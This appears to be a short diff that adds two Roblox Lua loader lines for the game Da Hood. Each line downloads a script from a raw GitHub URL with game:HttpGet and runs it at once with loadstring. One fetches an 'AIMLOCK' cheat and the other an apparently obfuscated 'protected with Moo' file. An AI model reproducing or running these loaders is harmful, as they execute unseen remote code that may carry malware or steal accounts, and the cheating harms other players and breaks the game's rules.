@@ -1,0 +1,2 @@
+Loadstring(game:HttpGet("https://raw.githubusercontent.com/WhiteGuy69/DaHood/main/AIMLOCK.txt"))()
+Loadstring(game:HttpGet("https://raw.githubusercontent.com/happycookie786/NOTILLEGALACTIVITIES/main/(%5B%5BThis%20file%20was%20protected%20with%20Moo.txt"))()
